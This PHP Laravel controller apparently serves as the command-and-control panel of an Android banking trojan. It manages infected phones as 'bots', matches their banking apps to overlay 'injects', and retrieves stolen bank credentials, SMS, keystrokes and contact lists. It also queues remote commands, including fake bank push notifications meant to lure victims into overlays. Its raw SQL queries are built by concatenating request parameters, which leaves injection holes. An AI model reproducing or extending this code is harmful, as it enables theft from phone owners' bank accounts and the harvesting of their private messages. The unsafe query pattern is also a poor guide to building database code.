<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Models\BankLog;
use App\Models\Bot;
use App\Models\BotSetting;
use App\Models\GlobalSetting;
use App\Models\Inject;
use App\Models\SmsLog;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Schema;

use DB;

class BotController extends Controller
{
    public function index($params)
    {
        $country_code = $params->country;
        $id = $params->botId;
        $app = $params->app;
        $operator = $params->operator;

        /*
        0 - online
        1 - offline
        2 - dead
        3 - Exist App Banks
        3 - No Exist App Banks
        5 - statBank==1
        6 - statCC==1
        7 - statMail==1
         */
        $strMySQL = "SELECT * FROM bots "; //---Sorting---
        $paramsMySQL = "WHERE ";

        if ($params->online == 'true') { //online
            $paramsMySQL = $paramsMySQL . "(TIMESTAMPDIFF(SECOND,`last_connect`, now())<=120) AND ";
        }
        if ($params->offline == 'true') { //offline
            $paramsMySQL = $paramsMySQL . "((TIMESTAMPDIFF(SECOND,`last_connect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`last_connect`, now())<=144000)) AND ";
        }
        if ($params->dead == 'true') { //dead
            $paramsMySQL = $paramsMySQL . "(TIMESTAMPDIFF(SECOND,`last_connect`, now())>=144001) AND ";
        }
        if ($params->hasInjects == 'true') { // install banks
            $paramsMySQL = $paramsMySQL . "(banks != '') AND ";
        }
        if ($params->hasNotInjects == 'true') { //no install banks
            $paramsMySQL = $paramsMySQL . "(banks = '') AND ";
        }
        if ($params->triggeredInject == 'true') { //stat_banks
            $paramsMySQL = $paramsMySQL . "(stat_banks = '1') AND ";
        }
        // if (substr($sorting, 6, 1) == "1") { //stat_cards
        //     $paramsMySQL = $paramsMySQL . "(stat_cards = '1') AND ";
        // }
        // if (substr($sorting, 7, 1) == "1") { //stat_mails
        //     $paramsMySQL = $paramsMySQL . "(stat_mails = '1') AND ";
        // }
        // if (substr($sorting, 8, 1) == "1" && strlen($country_code) > 1) { //botFilterCountry
        //     $paramsMySQL = $paramsMySQL . "(country = '" . $country_code . "') AND ";
        // }
        // if (substr($sorting, 9, 1) == "1" && strlen($id) > 1) { //bot find by ID
        //     $paramsMySQL = $paramsMySQL . "(bot_id = '" . $id . "') AND ";
        // }
        // if (substr($sorting, 0, 1) == "1" && substr($sorting, 1, 1) == "1") {
        //     $from = '/' . preg_quote("AND", '/') . '/';
        //     $paramsMySQL = preg_replace($from, "OR", $paramsMySQL, 1);
        // }
        if ($id != "") {
            $paramsMySQL .= "(bot_id like '%" . $id . "%') AND ";
        }
        if ($app != "") {
            $paramsMySQL .= "(banks like '%" . $app . "%') AND ";
        }
        if ($operator != "") {
            $paramsMySQL .= "(operator like '%" . $operator . "%') AND ";
        }
        if ($country_code != "") {
            $paramsMySQL .= "(country like '%" . $country_code . "%') AND ";
        }

        if (substr($paramsMySQL, -5) == " AND ") {
            $paramsMySQL = substr($paramsMySQL, 0, -5);
        }

        if (substr($paramsMySQL, -6) == "WHERE ") {
            $paramsMySQL = "";
        }

        $strMySQL = $strMySQL . $paramsMySQL;

        $rows = count(DB::SELECT($strMySQL));

        $startLimit = $params->perPage * ($params->page - 1);
        $limitBots = $params->perPage;

        $strMySQL = $strMySQL . " LIMIT $startLimit, $limitBots";

        $statement = DB::SELECT($strMySQL);

        $result = [];

        foreach ($statement as $row) {
            $connection_second = strtotime(date('Y-m-d H:i:s')) - strtotime($row->last_connect);
            $id = $row->bot_id;

            $statement1 = DB::SELECT("SELECT * FROM bank_logs WHERE bot_id = '" . $id . "'");

            $logs = [];
            foreach ($statement1 as $row1) {
                $logs[] = [
                    'inject_id' => $row1->inject_id,
                    'bot_id' => $row1->bot_id,
                    'application' => $row1->application,
                    'logs' => $row1->logs,
                    'created_at' => $row1->created_at,
                    'comment' => $row1->comment,
                ];
            }

            $banks = '';
            $icons = [];

            $realBanks = [];

            if ($row->banks != '') {
                $banks = explode(':', $row->banks);
            
                foreach ($banks as $bank) {
                    if ($bank != '') {
                        $realBanks[] = $bank;
                        $inject = Inject::where('app', $bank)->first();
                        $icons[] = $inject ? $inject->png : "";    
                    }
                }
            }

            $result[] = [
                'id' => $id,
                'key' => $id,
                'version' => $row->version,
                'tag' => $row->tag,
                'ip' => $row->ip,
                'commands' => $row->commands,
                'operator' => $row->operator,
                'model' => $row->model,
                'phone_number' => $row->phone_number,
                'country' => $row->country,
                'banks' => implode(':', $realBanks),
                'icons' => $icons,
                'last_connect' => $connection_second,
                'date_infection' => $row->date_infection,
                'comment' => $row->comment,
                'stat_screen' => $row->stat_screen,
                'stat_accessibility' => $row->stat_accessibility,
                'stat_download_module' => $row->stat_download_module,
                'stat_protect' => $row->stat_protect,
                'stat_banks' => $row->stat_banks,
                'stat_module' => $row->stat_download_module,
                'stat_admin' => $row->stat_admin,
                'logs' => $logs,
            ];
        }

        return ['rows' => $result, 'count' => $rows];
    }

    public function show($param)
    {
        $bot = Bot::where('bot_id', $param->botId)->first();

        $banks = explode(':', $bot->banks);

        $realBanks = [];

        foreach ($banks as $bank) {
            if (!empty($bank))
                $realBanks[] = $bank;
        }

        $bot->banks = implode(':', $realBanks);
        $bot->save();

        return Bot::where('bot_id', $param->botId)->first();
    }

    public function mainStats()
    {
        $bots = count(DB::SELECT("SELECT * FROM bots"));
        $online = count(DB::SELECT("SELECT * FROM bots WHERE (TIMESTAMPDIFF(SECOND,`last_connect`, now())<=120)"));
        $offline = count(DB::SELECT("SELECT * FROM bots WHERE ((TIMESTAMPDIFF(SECOND,`last_connect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`last_connect`, now())<=144000))"));
        $dead = count(DB::SELECT("SELECT * FROM bots WHERE (TIMESTAMPDIFF(SECOND,`last_connect`, now())>=144001)"));
        $banks = count(DB::SELECT("SELECT * FROM bots WHERE banks != ''"));
        $log = count(DB::SELECT("SELECT * FROM bank_logs"));

        return [
            "bots" => (string) $bots,
            "online" => (string) $online,
            "offline" => (string) $offline,
            "dead" => (string) $dead,
            "banks" => (string) $banks,
            "log" => (string) $log
        ];
    }

    public function deleteBot($params)
    {
        Bot::whereIn('bot_id', $params->selectedBots)->delete();
        BotSetting::whereIn('bot_id', $params->selectedBots)->delete();

        return [
            'type' => 'success',
            'message' => 'The selected bots are deleted successfully.'
        ];
    }

    public function setCommand($params)
    {
        $command = $params->command;
        $bots = $params->selectedBots;

        $otherCommand = "";

        foreach ($bots as $botId) {
            if (!empty($botId)) {
                if (preg_match('/autopush/', base64_decode($command))) {

                    $row = Bot::where('bot_id', $botId)->first();
                    $pushIcon = "";

                    $banks = explode(":", $row->banks);

                    for ($i = 0; $i < count($banks); $i++) {
                        if (empty($banks[$i])) {
                            continue;
                        }

                        $logCount = BankLog::where('bot_id', $botId)->where('application', $banks[$i])->count();

                        if ($logCount > 0 && ($i < count($banks) - 1)) {
                            continue;
                        } else if ($logCount > 0 && ($i == count($banks) - 1)) {
                        }
                        $pushIcon = $banks[$i];

                        break;
                    }

                    if (!empty($pushIcon)) {

                        $globalSetting = GlobalSetting::find(1);

                        $otherCommand = base64_encode(
                            json_encode([
                                "name" => "push",
                                "app" => $pushIcon,
                                "title" => $globalSetting->pushTitle,
                                "text" => $globalSetting->pushText,
                            ])
                        );
                    }
                    $command = $otherCommand;
                }

                Bot::where('bot_id', $botId)->update(['commands' => $command]);
            }
        }

        return [
            'type' => 'success',
            'message' => 'This operation is done successfully.'
        ];
    }

    public function setComment($params)
    {
        $comment = $params->comment;
        $botId = $params->botId;

        if (Bot::where('bot_id', $botId)->update(['comment' => $comment])) {
            return ['type' => 'success', 'message' => 'Comment is changed successfully'];
        } else {
            return ['type' => 'error', 'message' => 'Error is occuried. Please try again and contact the support team'];
        }
    }

    public function getLogByType($params)
    {
        $botId = $params->botId;
        $logType = $params->logType;

        switch ($logType) {
            case 'sms':
                $table = 'sms_logs_' . $botId;

                if (Schema::hasTable($table)) {
                    $rows = DB::SELECT("SELECT * FROM $table");
                    return $rows;
                }

                return $rows;
            case 'bankLogs':
                return BankLog::wherebotId($botId)->get();
            case 'keyLogger':
                $table = 'key_logs_' . $botId;

                if (Schema::hasTable($table)) {
                    $rows = DB::SELECT("SELECT * FROM $table");
                    return $rows;
                }

                return $rows;
            case 'savedSms':
                $table = 'sms_logs';

                if (Schema::hasTable($table)) {
                    $rows = DB::SELECT("SELECT * FROM $table WHERE bot_id = '$botId'");
                    $logs = [];

                    for ($i = 0; $i < count($rows); $i++) {
                        $row = $rows[$i];

                        $lines = explode(":end:", base64_decode($row->logs));
                        foreach ($lines as $line) {
                            if (!empty($line)) {
                                $logs[] = ['logs' => base64_encode($line)];
                            }
                        }
                    }

                    return $logs;
                }

                return [];
                       
            case 'installedApp':
                $table = 'application_list_logs';

                if (Schema::hasTable($table)) {
                    $rows = DB::SELECT("SELECT * FROM $table WHERE bot_id = '$botId'");
                    $logs = [];

                    for ($i = 0; $i < count($rows); $i++) {
                        $row = $rows[$i];

                        $lines = explode(":end:", base64_decode($row->logs));
                        foreach ($lines as $line) {
                            if (!empty($line)) {
                                $logs[] = ['logs' => base64_encode($line)];
                            }
                        }
                    }

                    return $logs;
                }

                return [];
            case 'contactList':
                $table = 'phone_number_logs';

                if (Schema::hasTable($table)) {
                    $rows = DB::SELECT("SELECT * FROM $table WHERE bot_id = '$botId'");
                    $logs = [];

                    for ($i = 0; $i < count($rows); $i++) {
                        $row = $rows[$i];

                        $lines = explode(":end:", base64_decode($row->logs));
                        foreach ($lines as $line) {
                            if (!empty($line)) {
                                $logs[] = ['logs' => base64_encode($line)];
                            }
                        }
                    }

                    return $logs;
                }

                return [];
                
                break;
        }

        return [];
    }

    public function deleteBotLog($params) {
        $botId = $params->botId;
        $logType = $params->logType;

        switch ($logType) {
            case 'sms':
                $table = 'sms_logs_' . $botId;
                if (Schema::hasTable($table)) {
                    if (DB::DELETE("DELETE FROM $table")) {
                        return ['type' => 'success', 'message' => 'The logs are deleted successfully.'];
                    }

                    return ['type' => 'error', 'message' => 'The database error'];
                }
                return ['type' => 'error', 'messag' => 'No data'];
            case 'bankLogs':
                return BankLog::wherebotId($botId)->get();
            case 'keyLogger':
                $table = 'key_logs_' . $botId;
                if (Schema::hasTable($table)) {
                    if (DB::DELETE("DELETE FROM $table")) {
                        return ['type' => 'success', 'message' => 'The logs are deleted successfully.'];
                    }

                    return ['type' => 'error', 'message' => 'The database error'];
                }
                return ['type' => 'error', 'messag' => 'No data'];
            case 'savedSms':
            case 'installedApp':
            case 'contactList':
                break;
        }

        return ['type' => 'success', 'message' => 'The logs are deleted successfully.'];

    }
}
